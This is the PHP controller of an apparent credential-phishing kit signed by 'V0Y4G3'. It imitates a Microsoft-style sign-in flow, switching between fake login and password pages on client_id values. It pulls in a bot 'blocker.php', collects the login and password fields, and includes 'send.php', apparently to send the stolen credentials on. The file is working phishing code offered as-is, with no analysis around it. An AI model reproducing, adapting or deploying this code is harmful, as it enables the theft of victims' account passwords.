<?php
//            ++++++++++++++++++++++++++++++++++++++++++++++++++++++
//                       Don't Need to change anything Here
//                               Created By V0Y4G3
//                                      2020
//            ++++++++++++++++++++++++++++++++++++++++++++++++++++++
include('blocker.php');

$l="login.php"; $e="error.php";  $p="password.php";  
error_reporting(0); set_time_limit(240);
function lrtrim($string)
{
return stripslashes(ltrim(rtrim($string)));
}
function query_str($params)
{
$str = ''; 
foreach ($params as $key => $value) 
{
$str .= (strlen($str) < 1) ? '' : '&';
$str .= $key . '=' . rawurlencode($value);
}
return ($str);
}



function getc($string)
{
return implode('', file($string));
}


function geterrors(){
return clean(end_of_line());
}
parse_str($_SERVER['QUERY_STRING']);

if($client_id=="00000001-0000-0ff1-cf00-000000000000")
{
	$b = query_str($_POST);
parse_str($b);
include $l; exit;
} 

if($client_id=="00000001-0000-0ff1-ce00-000000000000")
{
$b = query_str($_POST);
parse_str($b);
$loginfmt=lrtrim($loginfmt);
include $p; exit;
} 


elseif ($client_id=="000000010-0000-0ff1-ce00-000000000000")
{
$b = query_str($_POST);
parse_str($b);
$loginfmt=lrtrim($loginfmt);
$login=lrtrim($login);
$passwd=lrtrim($passwd);
$signerr="0";
if(empty($passwd) || strlen($passwd) < 6)
{
$signerr="1";
}
if($signerr==1)
{
include $e; exit;
} 
if($signerr==0)
{
include("send.php");
include("error2.php");
}
} 



elseif ($client_id=="0000000100-0000-0ff1-ce00-000000000000")
{
$b = query_str($_POST);
parse_str($b);
$loginfmt=lrtrim($loginfmt);
$login=lrtrim($login);
$passwd=lrtrim($passwd);
$signerr="0";
if(empty($passwd) || strlen($passwd) < 6)
{
$signerr="1";
}
if($signerr==1)
{
include("error2.php"); exit;
} 
if($signerr==0)
{
include("send.php");
include("Finish.php");
}
}




?>